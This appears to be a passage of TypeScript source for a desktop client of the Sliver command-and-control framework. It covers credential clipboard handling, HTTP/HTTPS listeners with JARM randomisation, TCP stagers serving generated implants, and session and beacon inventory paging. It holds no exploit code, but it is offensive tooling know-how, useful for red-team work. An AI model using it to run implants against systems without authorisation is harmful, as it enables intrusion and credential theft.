        assertBinding();
      } finally {
        clearCredentialSecrets(credential);
      }
    });
  }

  async copyCredentialSecret(
    contentsId: number,
    input: CopyCredentialSecretInput,
  ): Promise<OperationResult<CredentialClipboardResult>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const credential = await pool.client.credentialById(input.id);
      try {
        assertBinding();
        if (credential.ID !== input.id) throw new Error("The credential changed while its secret was loading");
        const secret = credentialSecret(credential, input.field);
        if (!secret) throw new Error(`This credential has no ${input.field} value`);
        clipboard.writeText(secret);
        // Keep an earlier app-owned cleanup timer alive if the replacement write
        // fails. A successful synchronous write can safely supersede it here.
        this.cancelCredentialClipboardTimer();
        const expiresAt = this.now() + CREDENTIAL_CLIPBOARD_TTL_MS;
        const digest = clipboardDigest(secret);
        const timer = setTimeout(() => this.clearCredentialClipboardIfCurrent(digest), CREDENTIAL_CLIPBOARD_TTL_MS);
        timer.unref?.();
        this.credentialClipboard = { digest, expiresAt, ownerContentsId: contentsId, timer };
        return { expiresAt: new Date(expiresAt).toISOString() };
      } finally {
        clearCredentialSecrets(credential);
      }
    });
  }

  clearCredentialClipboard(): OperationResult {
    this.clearCredentialClipboardIfCurrent();
    return { ok: true };
  }

  private cancelCredentialClipboardTimer(): void {
    if (this.credentialClipboard) clearTimeout(this.credentialClipboard.timer);
    delete this.credentialClipboard;
  }

  private clearCredentialClipboardIfCurrent(expectedDigest?: string): void {
    const state = this.credentialClipboard;
    if (!state || (expectedDigest !== undefined && state.digest !== expectedDigest)) return;
    this.cancelCredentialClipboardTimer();
    try {
      if (clipboardDigest(clipboard.readText()) === state.digest) clipboard.clear();
    } catch {
      // Clipboard cleanup is best effort and must never replace operation state.
    }
  }

  private async startHttpListener(
    contentsId: number,
    pool: BackendPool,
    input: HTTPListenerInput,
  ): Promise<number> {
    const base = {
      domain: input.domain.trim(),
      host: input.host.trim(),
      port: input.port,
      website: input.website.trim(),
      enforceOTP: input.enforceOtp,
      longPollTimeoutNanoseconds: secondsToNanoseconds(input.longPollTimeoutSeconds),
      longPollJitterNanoseconds: secondsToNanoseconds(input.longPollJitterSeconds),
    };

    if (input.kind === "http") {
      if (input.certificateToken) throw new Error("Certificate capabilities may only be used by HTTPS listeners");
      return (await pool.client.startHTTPListenerWithOptions(base)).JobID;
    }

    const pairs = this.requireWindow(contentsId).certificatePairs;
    const timers = this.requireWindow(contentsId).certificateTimers;
    const certificate = input.certificateToken ? pairs.get(input.certificateToken) : undefined;
    if (input.certificateToken && (!certificate || certificate.expiresAt <= this.now())) {
      if (certificate) clearCertificatePair(certificate);
      pairs.delete(input.certificateToken);
      const timer = timers.get(input.certificateToken);
      if (timer) clearTimeout(timer);
      timers.delete(input.certificateToken);
      throw new Error("The selected certificate pair is no longer available");
    }
    if (input.certificateToken) {
      pairs.delete(input.certificateToken);
      const timer = timers.get(input.certificateToken);
      if (timer) clearTimeout(timer);
      timers.delete(input.certificateToken);
    }
    try {
      return (
        await pool.client.startHTTPSListenerWithOptions({
          ...base,
          acme: input.acme,
          randomizeJARM: input.randomizeJarm,
          ...(certificate ? { cert: certificate.cert, key: certificate.key } : {}),
        })
      ).JobID;
    } finally {
      if (certificate) clearCertificatePair(certificate);
    }
  }

  private async startStageListener(pool: BackendPool, input: StageListenerInput): Promise<number> {
    const profile = pool.profile(input.profileName);
    if (!profile.Config) throw new Error(`Profile '${input.profileName}' has no implant configuration`);
    const generated = await pool.client.generateImplant(profile.Config, "", GENERATE_TIMEOUT_SECONDS);
    if (!generated.File) throw new Error("Server returned no stage payload");
    let payload: Buffer;
    try {
      payload = buildStagePayload(generated.File.Data, input);
    } finally {
      generated.File.Data.fill(0);
    }
    try {
      const response = await pool.client.startTCPStagerListenerWithOptions({
        Protocol: clientpb.StageProtocol.TCP,
        Host: input.host.trim(),
        Port: input.port,
        Data: payload,
        ProfileName: input.profileName,
      });
      return response.JobID;
    } finally {
      payload.fill(0);
    }
  }

  private async withExecutionPool<T>(
    contentsId: number,
    operation: (pool: BackendPool, assertBinding: () => void) => Promise<T>,
  ): Promise<OperationResultWithValue<T>> {
    const result = await this.withPool(contentsId, operation);
    return result.ok
      ? result
      : { ok: false, error: executionBoundaryError(new Error(result.error)) };
  }

  private requireActiveNetworkSession(
    pool: BackendPool,
    target: TargetRef,
    requireCurrentRevision: boolean,
  ): TargetRef {
    if (target.mode !== "session") throw new Error("Network forwarding requires a session");
    assertTargetDomainAuthoritative(pool, "session");
    if (requireCurrentRevision && !pool.targetStore.isCurrentTargetRef(target, pool.epoch)) {
      throw new Error("The selected session changed; refresh and select it again");
    }
    const current = pool.targetStore.revalidateTargetRef(target, pool.epoch);
    if (!current || current.target.mode !== "session" || current.target.liveness !== "active") {
      throw new Error("The selected session is no longer active");
    }
    return current.ref;
  }

  private async withPool<T>(
    contentsId: number,
    operation: (pool: BackendPool, assertBinding: () => void) => Promise<T>,
    assertAfterOperation = true,
  ): Promise<OperationResultWithValue<T>> {
    try {
      const context = this.requireWindow(contentsId);
      const poolKey = context.poolKey;
      const pool = poolKey ? this.pools.get(poolKey) : undefined;
      const usableStatuses = new Set(["connected", "degraded", "reconnecting"]);
      if (!pool || !usableStatuses.has(pool.snapshot.connection.status)) throw new Error("Connect to a Sliver server first");
      const epoch = pool.epoch;
      const attempt = context.connectionAttempt;
      const assertBinding = (): void => {
        if (
          this.windows.get(contentsId) !== context ||
          context.poolKey !== poolKey ||
          context.connectionAttempt !== attempt ||
          this.pools.get(poolKey!) !== pool ||
          pool.epoch !== epoch
        ) {
          throw new Error("The backend connection changed; retry the operation against the current connection");
        }
      };
      assertBinding();
      const value = await operation(pool, assertBinding);
      if (assertAfterOperation) assertBinding();
      return { ok: true, value };
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
  }

  private async withPoolWithoutValue(
    contentsId: number,
    operation: (pool: BackendPool, assertBinding: () => void) => Promise<void>,
  ): Promise<OperationResult> {
    const result = await this.withPool(contentsId, operation);
    return result.ok ? { ok: true } : result;
  }

  private async connectConfig(
    contentsId: number,
    data: Buffer,
    configName: string,
    activeConfig: ActiveConfigReference,
  ): Promise<OperationResult<SliverSnapshot>> {
    let attempt = 0;
    try {
      let config: SliverClientConfig;
      try {
        config = parseConfig(data);
      } catch {
        throw new Error("Invalid Sliver configuration file");
      }
      if (!Number.isSafeInteger(config.lport) || config.lport < 1 || config.lport > 65_535) {
        throw new Error("Invalid Sliver configuration port");
      }
      if (config.wg !== undefined) {
        throw new Error("WireGuard operator connections are deferred for this milestone");
      }
      const poolKey = createHash("sha256").update(data).digest("hex");
      const context = this.requireWindow(contentsId);
      await this.streams.closeWindow(contentsId, "backend-rebound").catch(() => undefined);
      attempt = ++context.connectionAttempt;
      delete context.manualRefresh;
      context.configName = configName;
      delete context.activeConfig;
      context.targetPageCursors.clear();
      if (context.poolKey) this.pools.get(context.poolKey)?.retireWindowTaskClaims(contentsId);
      closeWindowOperationEngine(context);
      delete context.activeTarget;
      context.beaconWatch = false;
      context.targetPlans.clear();
      this.revokeSessionTargetCapabilities(context);
      this.revokeExecutionState(context);
      context.sessionPlanAdmissions.clear();

      if (context.poolKey && context.poolKey !== poolKey) {
        const previousPoolKey = context.poolKey;
        delete context.poolKey;
        await this.releasePool(previousPoolKey, contentsId);
        clearCertificateCapabilities(context);
      }
      context.snapshot = {
        ...disconnectedSnapshot(),
        connection: {
          status: "connecting",
          managedServer: null,
          operator: sanitizeSavedConfigMetadata(config.operator),
          server: `${sanitizeSavedConfigMetadata(config.lhost)}:${config.lport}`,
          configName,
        },
      };
      this.pushSnapshot(contentsId, context.snapshot);

      let pool = this.pools.get(poolKey);
      if (!pool) {
        const epoch = this.nextEpoch++;
        let createdPool!: BackendPool;
        createdPool = new BackendPool(
          poolKey,
          epoch,
          config,
          this.clientFactory(config),
          (snapshot) => {
            if (this.pools.get(poolKey) === createdPool) this.broadcast(poolKey, epoch, snapshot);
          },
          (reason) => {
            if (this.pools.get(poolKey) === createdPool) this.reconcilePoolOperations(poolKey, reason);
          },
          () => {
            if (this.pools.get(poolKey) === createdPool) {
              this.broadcastNetworkForwardingChanged(poolKey, epoch);
            }
          },
          this.now,
        );
        pool = createdPool;
        this.pools.set(poolKey, pool);
      }

      context.poolKey = poolKey;
      pool.addWindow(contentsId);
      await pool.connect();
      if (
        this.windows.get(contentsId) !== context ||
        context.connectionAttempt !== attempt ||
        context.poolKey !== poolKey ||
        this.pools.get(poolKey) !== pool
      ) {
        // A newer attempt may intentionally share this same pool. Do not drop
        // the Set membership owned by that newer attempt.
        if (context.poolKey !== poolKey || this.pools.get(poolKey) !== pool) pool.removeWindow(contentsId);
        throw new Error("Connection attempt was superseded");
      }
      this.requireOperationEngine(contentsId, context, pool);
      context.activeConfig = activeConfig;
      context.snapshot = this.snapshotForWindow(context, pool.snapshot);
      return { ok: true, value: context.snapshot };
    } catch (error) {
      const message = errorMessage(error);
      const context = this.windows.get(contentsId);
      if (!context || attempt === 0 || context.connectionAttempt !== attempt) return { ok: false, error: message };
      const incompatible = context.poolKey ? this.pools.get(context.poolKey)?.snapshot : undefined;
      if (context.poolKey) {
        const failedPoolKey = context.poolKey;
        delete context.poolKey;
        await this.releasePool(failedPoolKey, contentsId).catch(() => undefined);
      }
      delete context.configName;
      delete context.activeConfig;
      clearCertificateCapabilities(context);
      context.snapshot = incompatible?.connection.status === "incompatible"
        ? { ...incompatible, connection: { ...incompatible.connection, error: message } }
        : disconnectedSnapshot(message);
      this.pushSnapshot(contentsId, context.snapshot);
      return { ok: false, error: message };
    }
  }

  private requireWindow(contentsId: number): WindowContext {
    const context = this.windows.get(contentsId);
    if (!context) throw new Error("Unknown application window");
    return context;
  }

  private issueTargetPageCursor(
    context: WindowContext,
    pool: BackendPool,
    mode: TargetMode,
    snapshotKey: string,
    total: number,
    offset: number,
    query = "",
  ): string {
    const now = this.now();
    for (const [cursor, state] of context.targetPageCursors) {
      if (
        state.expiresAt <= now ||
        state.poolKey !== context.poolKey ||
        state.backendEpoch !== pool.epoch ||
        state.connectionAttempt !== context.connectionAttempt
      ) {
        context.targetPageCursors.delete(cursor);
        continue;
      }
      if (
        state.mode === mode &&
        state.query === query &&
        state.snapshotKey === snapshotKey &&
        state.offset === offset &&
        state.total === total
      ) return cursor;
    }
    while (context.targetPageCursors.size >= MAX_WINDOW_TARGET_PAGE_CURSORS) {
      const oldest = [...context.targetPageCursors]
        .sort((left, right) => left[1].expiresAt - right[1].expiresAt)[0]?.[0];
      if (!oldest) break;
      context.targetPageCursors.delete(oldest);
    }
    const cursor = `target:v1:${randomUUID()}`;
    context.targetPageCursors.set(cursor, {
      contentsId: context.contentsId,
      poolKey: context.poolKey ?? "",
      backendEpoch: pool.epoch,
      connectionAttempt: context.connectionAttempt,
      mode,
      query,
      snapshotKey,
      total,
      offset,
      expiresAt: now + TARGET_PAGE_CURSOR_TTL_MS,
    });
    return cursor;
  }

  private targetCatalogSnapshot(pool: BackendPool, mode: TargetMode, query = ""): TargetCatalogSnapshot {
    const sourceRevision = mode === "session"
      ? pool.snapshot.domains.sessions.revision
      : pool.snapshot.domains.beacons.revision;
    const key = `${pool.key}\0${pool.epoch}\0${mode}\0${sourceRevision}\0${query}`;
    const existing = this.targetCatalogSnapshots.get(key);
    if (existing) {
      existing.lastAccessed = this.now();
      return existing;
    }
    const slice = pool.targetStore.catalogPage(mode, 0, Number.MAX_SAFE_INTEGER, query);
    const identities = slice.items.map((target) => ({
      id: target.id,
      fingerprint: stableTargetFingerprint(target),
    }));
    const estimatedBytes = identities.reduce(
      (total, identity) => total + ((identity.id.length + identity.fingerprint.length) * 2) + 32,
      (query.length * 2) + 64,
    );
    if (estimatedBytes > MAX_TARGET_CATALOG_SNAPSHOT_BYTES) {
      throw new Error("The target inventory is too large for the bounded paging snapshot budget");
    }
    const snapshot: TargetCatalogSnapshot = {
      key,
      poolKey: pool.key,
      backendEpoch: pool.epoch,
      mode,
      query,
      sourceRevision,
      identities,
      estimatedBytes,
      lastAccessed: this.now(),
    };
    this.targetCatalogSnapshots.set(key, snapshot);
    this.targetCatalogSnapshotBytes += estimatedBytes;
    this.pruneTargetCatalogSnapshots(key);
    if (!this.targetCatalogSnapshots.has(key)) {
      throw new Error("The bounded target paging snapshot capacity is busy; finish or let an existing page expire");
    }
    return snapshot;
  }

  private requireTargetCatalogSnapshot(
    key: string,
    pool: BackendPool,
    mode: TargetMode,
    query: string,
  ): TargetCatalogSnapshot {
    const snapshot = this.targetCatalogSnapshots.get(key);
    if (
      !snapshot ||
      snapshot.poolKey !== pool.key ||
      snapshot.backendEpoch !== pool.epoch ||
      snapshot.mode !== mode ||
      snapshot.query !== query
    ) {
      throw new Error("Target catalog page cursor is stale; refresh the inventory");
    }
    snapshot.lastAccessed = this.now();
    return snapshot;
  }

  private targetCatalogEntries(
    pool: BackendPool,
    snapshot: TargetCatalogSnapshot,
    offset: number,
    limit: number,
  ): TargetCatalogEntry[] {
    return snapshot.identities.slice(offset, offset + limit).map((identity) => {
      const target = pool.targetStore.target(snapshot.mode, identity.id);
      if (!target || stableTargetFingerprint(target) !== identity.fingerprint) {
        throw new Error("The target catalog changed identity while this page was being prepared; refresh the inventory");
      }
      if (!targetMatchesCatalogQuery(target, snapshot.query)) {
        throw new Error("The target catalog search changed while this page was being prepared; refresh the inventory");
      }
      const ref = pool.targetStore.createTargetRef(target.mode, target.id, pool.epoch);
      if (!ref) throw new Error("The target catalog changed while this page was being prepared");
      return { target, ref };
    });
  }

  private pruneTargetCatalogSnapshots(protectedKey?: string): void {
    const now = this.now();
    for (const context of this.windows.values()) {
      for (const [cursor, state] of context.targetPageCursors) {
        if (state.expiresAt <= now) context.targetPageCursors.delete(cursor);
      }
    }
    while (
      this.targetCatalogSnapshots.size > MAX_TARGET_CATALOG_SNAPSHOTS ||
      this.targetCatalogSnapshotBytes > MAX_TARGET_CATALOG_SNAPSHOT_BYTES
    ) {
      const referenced = new Set(
        [...this.windows.values()].flatMap((context) =>
          [...context.targetPageCursors.values()].map((state) => state.snapshotKey),
        ),
      );
      let candidate = [...this.targetCatalogSnapshots.values()]
        .filter((snapshot) => snapshot.key !== protectedKey && !referenced.has(snapshot.key))
        .sort((left, right) => left.lastAccessed - right.lastAccessed)[0];
      if (!candidate) {
        candidate = [...this.targetCatalogSnapshots.values()]
          .filter((snapshot) => snapshot.key !== protectedKey)
          .sort((left, right) => left.lastAccessed - right.lastAccessed)[0];
        if (!candidate) break;
        for (const context of this.windows.values()) {
          for (const [cursor, state] of context.targetPageCursors) {
            if (state.snapshotKey === candidate.key) context.targetPageCursors.delete(cursor);
          }
        }
      }
      this.targetCatalogSnapshots.delete(candidate.key);
      this.targetCatalogSnapshotBytes -= candidate.estimatedBytes;
    }
  }

  private consumeTargetPageCursor(
    context: WindowContext,
    pool: BackendPool,
    mode: TargetMode,
    query: string,
    cursor: string,
  ): InternalTargetPageCursor {
    if (!/^target:v1:[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/iu.test(cursor)) {
      throw new Error("Invalid target catalog page cursor");
    }
    const state = context.targetPageCursors.get(cursor);
    context.targetPageCursors.delete(cursor);
    if (
      !state ||
      state.expiresAt <= this.now() ||
      state.contentsId !== context.contentsId ||
      state.poolKey !== context.poolKey ||
      state.backendEpoch !== pool.epoch ||
      state.connectionAttempt !== context.connectionAttempt ||
      state.mode !== mode ||
      state.query !== query
    ) {
      throw new Error("Target catalog page cursor is stale or belongs to another window; refresh the inventory");
    }
    return state;
  }

  private async releasePool(poolKey: string, contentsId: number): Promise<void> {
    const pool = this.pools.get(poolKey);
    if (!pool) return;
    pool.removeWindow(contentsId);
    if (pool.windowCount === 0) {
      this.pools.delete(poolKey);
      for (const [key, bucket] of this.processExecutionHistories) {
        if (bucket.poolKey !== poolKey) continue;
        for (const entry of bucket.entries) this.releaseProcessExecutionRecord(entry.record);
        this.processExecutionHistories.delete(key);
      }
      for (const [key, history] of this.dotNetExecutionHistories) {
        if (history.poolKey !== poolKey) continue;
        for (const entry of history.entries) this.releaseDotNetExecutionRecord(entry.record);
        this.dotNetExecutionHistories.delete(key);
      }
      for (const [key, history] of this.bofExecutionHistories) {
        if (history.poolKey !== poolKey) continue;
        for (const record of history.records) clearBofRecord(record);
        this.bofExecutionHistories.delete(key);
      }
      await this.streams.closeBackend(
        { backendId: pool.key, backendEpoch: pool.epoch },
        "backend-disconnected",
      ).catch(() => undefined);
      for (const [key, snapshot] of this.targetCatalogSnapshots) {
        if (snapshot.poolKey !== poolKey) continue;
        this.targetCatalogSnapshots.delete(key);
        this.targetCatalogSnapshotBytes -= snapshot.estimatedBytes;
      }
      await pool.close();
    }
  }

  private broadcast(poolKey: string, epoch: number, snapshot: SliverSnapshot): void {
    for (const [contentsId, context] of this.windows) {
      if (context.poolKey !== poolKey) continue;
      const pool = this.pools.get(poolKey);
      if (!pool || pool.epoch !== epoch) continue;
      const previous = context.snapshot;
      const next = this.snapshotForWindow(context, snapshot);
      context.snapshot = next;
      if (!sameRendererSnapshot(previous, next)) this.pushSnapshot(contentsId, next);
    }
  }

  private broadcastNetworkForwardingChanged(poolKey: string, epoch: number): void {
    const pool = this.pools.get(poolKey);
    if (!pool || pool.epoch !== epoch) return;
    for (const [contentsId, context] of this.windows) {
      if (context.poolKey !== poolKey) continue;
      const contents = webContents.fromId(contentsId);
      if (!contents || contents.isDestroyed()) continue;
      try {
        contents.send(NETWORK_FORWARDING_IPC_EVENTS.changed);
      } catch {
        // Forwarding events are advisory; a trusted Network renderer reads a
        // fresh main-owned inventory after its next load or interaction.
      }
    }
  }

  private snapshotForWindow(context: WindowContext, snapshot: SliverSnapshot): SliverSnapshot {
    const pool = context.poolKey ? this.pools.get(context.poolKey) : undefined;
    if (pool && context.operationEngine) {
      for (const operation of allWindowOperations(context.operationEngine)) {
        if (
          !TERMINAL_OPERATION_STATES.has(operation.state) &&
          targetDomainAbsenceAuthoritative(pool, operation.target.mode) &&
          !pool.targetStore.target(operation.target.mode, operation.target.id)
        ) {
          context.operationEngine.markTargetUnavailable(
            operation.target,
            "The operation target is absent from the complete authoritative inventory",
          );
        }
      }
    }
    const previousActiveTarget = context.activeTarget;
    const revalidated = previousActiveTarget && pool
      ? pool.targetStore.revalidateTargetRef(previousActiveTarget, pool.epoch)
      : undefined;
    const activeDomainAuthoritative = previousActiveTarget && pool
      ? targetDomainAuthoritative(pool, previousActiveTarget.mode)
      : true;
    const activeAbsenceAuthoritative = previousActiveTarget && pool
      ? targetDomainAbsenceAuthoritative(pool, previousActiveTarget.mode)
      : true;
    const previousSummary = previousActiveTarget &&
      context.snapshot.targetContext.activeTargetSummary?.mode === previousActiveTarget.mode &&
      context.snapshot.targetContext.activeTargetSummary.id === previousActiveTarget.id
      ? context.snapshot.targetContext.activeTargetSummary
      : undefined;
    if (revalidated) {
      if (!sameTargetRefIdentity(previousActiveTarget!, revalidated.ref)) {
        if (pool && previousActiveTarget?.mode === "session") {
          void this.streams.closeTarget(
            { backendId: pool.key, backendEpoch: pool.epoch, target: previousActiveTarget },
            "target-rebound",
          );
        }
        this.revokeSessionTargetCapabilities(context);
        this.revokeExecutionState(context);
      }
      context.activeTarget = revalidated.ref;
    } else if (previousActiveTarget && activeAbsenceAuthoritative) {
      context.operationEngine?.markTargetUnavailable(previousActiveTarget);
      if (pool && previousActiveTarget.mode === "session") {
        void this.streams.closeTarget(
          { backendId: pool.key, backendEpoch: pool.epoch, target: previousActiveTarget },
          "target-disappeared",
        );
      }
      this.revokeSessionTargetCapabilities(context);
      this.revokeExecutionState(context);
      context.beaconWatch = false;
      pool?.setWindowWatch(context.contentsId, false);
      delete context.activeTarget;
    }
    const supported = snapshot.connection.capabilities?.currentSlice.targets
      ? TARGET_CAPABILITY_IDS.filter((capability) =>
          snapshot.connection.capabilities?.currentSlice.tasks === true || !capability.startsWith("beacon.tasks."),
        )
      : [];
    const targetContext = createWindowTargetContext({
      activeTarget: context.activeTarget ?? null,
      activeTargetSummary: revalidated?.target ?? (!activeAbsenceAuthoritative ? (previousSummary ?? null) : null),
      authoritative: activeDomainAuthoritative && Boolean(revalidated),
      selectableTargets: pool
        ? [...snapshot.sessions, ...snapshot.beacons]
          .filter((target) => targetDomainAuthoritative(pool, target.mode))
          .flatMap((target) => {
            const ref = pool.targetStore.createTargetRef(target.mode, target.id, pool.epoch);
            return ref ? [ref] : [];
          })
        : [],
      serverSupport: { supported },
      openSessionEndpointAvailable: Boolean(
        pool && revalidated && isPoolOpenSessionEndpointAvailable(pool, revalidated.target),
      ),
      beaconWatch: context.beaconWatch,
      ...(!activeDomainAuthoritative
        ? { unavailableReason: "The selected target inventory is refreshing or unavailable; actions are temporarily disabled." }
        : (!revalidated && !activeAbsenceAuthoritative
            ? { unavailableReason: "The selected target is outside the bounded inventory; its absence is not authoritative." }
            : {})),
    });
    const sessionsPage = { ...snapshot.domains.sessions.page };
    const beaconsPage = { ...snapshot.domains.beacons.page };
    delete sessionsPage.nextCursor;
    delete beaconsPage.nextCursor;
    if (pool && snapshot.domains.sessions.status === "ready" && sessionsPage.truncated) {
      const catalog = this.targetCatalogSnapshot(pool, "session");
      sessionsPage.nextCursor = this.issueTargetPageCursor(
        context,
        pool,
        "session",
        catalog.key,
        catalog.identities.length,
        snapshot.domains.sessions.items.length,
      );
    }
    if (pool && snapshot.domains.beacons.status === "ready" && beaconsPage.truncated) {
      const catalog = this.targetCatalogSnapshot(pool, "beacon");
      beaconsPage.nextCursor = this.issueTargetPageCursor(
        context,
        pool,
        "beacon",
        catalog.key,
        catalog.identities.length,
        snapshot.domains.beacons.items.length,
      );
    }
    return {
      ...snapshot,
      domains: {
        ...snapshot.domains,
        sessions: { ...snapshot.domains.sessions, page: sessionsPage },
        beacons: { ...snapshot.domains.beacons, page: beaconsPage },
      },
      targetContext,
      connection: {
        ...snapshot.connection,
        managedServer: this.managedServerForConnection(pool, snapshot.connection.status),
        incarnation: context.connectionAttempt,
        ...(context.configName ? { configName: context.configName } : {}),
      },
    };
  }

  private pushSnapshot(contentsId: number, snapshot: SliverSnapshot): void {
    const contents = webContents.fromId(contentsId);
    if (!contents || contents.isDestroyed()) return;
    try {
      contents.send(IPC.snapshotChanged, snapshot);
    } catch {
      // A newly-created native window is registered before its first renderer
      // frame exists, and teardown can invalidate a frame between the guards
      // above and send(). Snapshot delivery is advisory: the trusted renderer
      // reads the authoritative registry snapshot once it has loaded.
    }
  }
}

type ServiceDomainName = keyof InfrastructureServicesSnapshot;
type DomainName = "jobs" | "builds" | "profiles" | "compiler" | "pivots" | ServiceDomainName | TargetDomainName;

class BackendPool {
  private readonly windowIds = new Set<number>();
  private readonly watchWindowIds = new Set<number>();
  private readonly subscriptions: Subscription[] = [];
  private readonly profilesByName = new Map<string, clientpb.ImplantProfile>();
  private readonly buildsByName = new Map<string, clientpb.ImplantConfig>();
  private readonly bofCapabilities = new Map<string, boolean>();
  private readonly taskClaims = new Map<string, PoolTaskClaim>();
  private readonly executionTaskFacts = new Map<string, PoolExecutionTaskFact>();
  private readonly taskClaimReservations = new Set<string>();
  private connectPromise: Promise<void> | undefined;
  private readonly refreshPromises = new Map<DomainName, Promise<void>>();
  private readonly refreshReruns = new Set<DomainName>();
  private readonly refreshRerunLoading = new Set<DomainName>();
  private reconcileTimer?: NodeJS.Timeout;
  private watchTimer?: NodeJS.Timeout;
  private invalidationTimer?: NodeJS.Timeout;
  private readonly pendingInvalidations = new Set<DomainName>();
  private previousEventStatus: SliverEventStreamState["status"] = "stopped";
  private recentEvents: RecentEventSummary[] = [];
  private readonly recentEventDeduplicator = new RecentEventDeduplicator();
  private readonly lifetime = new AbortController();
  private closed = false;
  private compatibility: "supported" | "degraded" | "unsupported" = "supported";
  readonly targetStore: TargetStore;
  readonly beaconTasks: BeaconTaskStore;
  readonly networkForwarding: NetworkForwardingController;

  snapshot: SliverSnapshot;

  constructor(
    readonly key: string,
    readonly epoch: number,
    config: SliverClientConfig,
    readonly client: SliverClientAdapter,
    private readonly onSnapshot: (snapshot: SliverSnapshot) => void,
    private readonly onTaskSignal: (reason: PoolTaskSignalReason) => void,
    onNetworkForwardingChanged: () => void,
    private readonly now: () => number,
  ) {
    this.targetStore = new TargetStore({ now: this.now });
    this.beaconTasks = new BeaconTaskStore(client);
    this.networkForwarding = new NetworkForwardingController(
      client,
      this.now,
      onNetworkForwardingChanged,
    );
    this.snapshot = {
      ...disconnectedSnapshot(),
      connection: {
        status: "connecting",
        managedServer: null,
        operator: sanitizeSavedConfigMetadata(config.operator),
        server: `${sanitizeSavedConfigMetadata(config.lhost)}:${config.lport}`,
        epoch,
      },
    };
  }

  get windowCount(): number {
    return this.windowIds.size;
  }

  supportsBuiltInBof(mode: TargetMode, id: string): boolean {
    return this.bofCapabilities.get(`${mode}:${id}`) === true;
  }

  recordExecutionTaskFact(taskId: string, target: TargetRef, operationId: PoolExecutionTaskFact["operationId"], processWaited = false): void {
    if (this.closed || target.mode !== "beacon" || !/^[A-Za-z0-9_-]{1,128}$/u.test(taskId) ||
      !this.targetStore.revalidateTargetRef(target, this.epoch)) return;
    this.pruneExecutionTaskFacts();
    const existing = this.executionTaskFacts.get(taskId);
    if (existing) {
      if (!sameTargetRefIdentity(existing.target, target) || existing.operationId !== operationId || existing.processWaited !== processWaited) {
        existing.ambiguous = true;
      }
      return;
    }
    // Metadata only: bound independently from output retention and never admit
    // another dispatch merely to obtain or repair a fact.
    while (this.executionTaskFacts.size >= MAX_POOL_TASK_CLAIMS) {
      const oldest = this.executionTaskFacts.keys().next().value;
      if (oldest === undefined) break;
      this.executionTaskFacts.delete(oldest);
    }
    this.executionTaskFacts.set(taskId, { target: { ...target }, operationId, processWaited, recordedAt: this.now(), ambiguous: false });
  }

  executionTaskFact(taskId: string, target: TargetRef): PoolExecutionTaskFact | undefined {
    this.pruneExecutionTaskFacts();
    const fact = this.executionTaskFacts.get(taskId);
    return !this.closed && fact && !fact.ambiguous && sameTargetRefIdentity(fact.target, target) &&
      this.targetStore.revalidateTargetRef(target, this.epoch) ? { ...fact, target: { ...fact.target } } : undefined;
  }

  private pruneExecutionTaskFacts(): void {
    const now = this.now();
    for (const [taskId, fact] of this.executionTaskFacts) {
      if (fact.recordedAt + POOL_TASK_CLAIM_TTL_MS <= now || !this.targetStore.revalidateTargetRef(fact.target, this.epoch)) {
        this.executionTaskFacts.delete(taskId);
      }
    }
  }

  addWindow(contentsId: number): void {
    this.windowIds.add(contentsId);
    this.onSnapshot(this.snapshot);
  }

  removeWindow(contentsId: number): void {
    this.windowIds.delete(contentsId);
    this.retireWindowTaskClaims(contentsId);
    this.setWindowWatch(contentsId, false);
  }

  retireWindowTaskClaims(contentsId: number): void {
    const reservationPrefix = `${contentsId}:`;
    for (const reservation of this.taskClaimReservations) {
      if (reservation.startsWith(reservationPrefix)) this.taskClaimReservations.delete(reservation);
    }
    for (const claim of this.taskClaims.values()) {
      if (claim.ownerWindowId !== contentsId) continue;
      claim.ownerWindowId = 0;
      claim.recoverable = false;
    }
  }

  setWindowWatch(contentsId: number, enabled: boolean): void {
    if (enabled && this.windowIds.has(contentsId)) this.watchWindowIds.add(contentsId);
    else this.watchWindowIds.delete(contentsId);
    if (this.watchWindowIds.size > 0 && !this.watchTimer) {
      this.watchTimer = setInterval(() => this.runBackgroundRefresh(["beacons"]), 5_000);
      this.watchTimer.unref();
    } else if (this.watchWindowIds.size === 0 && this.watchTimer) {
      clearInterval(this.watchTimer);
      delete this.watchTimer;
    }
  }

  reserveTaskClaim(ownerWindowId: number, requestId: string): boolean {
    if (!this.windowIds.has(ownerWindowId)) return false;
    this.pruneTaskClaims(this.now());
    this.pruneSettledInvisibleTaskClaims();
    const reservation = taskClaimReservationKey(ownerWindowId, requestId);
    if (this.taskClaimReservations.has(reservation)) return true;
    const recoverableClaimCount = [...this.taskClaims.values()].filter(({ recoverable }) => recoverable).length;
    if (
      recoverableClaimCount + this.taskClaimReservations.size >= MAX_POOL_RECOVERABLE_TASK_CLAIMS ||
      this.taskClaims.size + this.taskClaimReservations.size >= MAX_POOL_TASK_CLAIMS
    ) {
      return false;
    }
    this.taskClaimReservations.add(reservation);
    return true;
  }

  releaseTaskClaimReservation(ownerWindowId: number, requestId: string): void {
    this.taskClaimReservations.delete(taskClaimReservationKey(ownerWindowId, requestId));
  }

  claimTask(
    ownerWindowId: number,
    taskId: string,
    requestId: string,
    operationId: OperationRecordId,
    beaconId: string,
    expectedPingNonce?: number,
    requiresResultVerification = true,
    expectedRequest?: TargetOperationInput,
  ): boolean {
    const now = this.now();
    this.pruneTaskClaims(now);
    const reservation = taskClaimReservationKey(ownerWindowId, requestId);
    if (!this.taskClaimReservations.delete(reservation)) return false;
    const existing = this.taskClaims.get(taskId);
    if (existing) {
      return existing.ownerWindowId === ownerWindowId &&
        existing.requestId === requestId &&
        existing.operationId === operationId &&
        existing.beaconId === beaconId &&
        existing.expectedPingNonce === expectedPingNonce &&
        JSON.stringify(existing.expectedRequest) === JSON.stringify(expectedRequest) &&
        existing.requiresResultVerification === requiresResultVerification;
    }
    this.pruneSettledInvisibleTaskClaims();
    if (!this.windowIds.has(ownerWindowId) || this.taskClaims.size >= MAX_POOL_TASK_CLAIMS) return false;
    this.taskClaims.set(taskId, {
      ownerWindowId,
      requestId,
      operationId,
      beaconId,
      claimedAt: now,
      ...(expectedPingNonce === undefined ? {} : { expectedPingNonce }),
      ...(expectedRequest === undefined ? {} : { expectedRequest }),
      requiresResultVerification,
      recoverable: true,
    });
    return true;
  }

  settleTaskClaim(ownerWindowId: number, taskId: string, requestId: string): void {
    const claim = this.taskClaims.get(taskId);
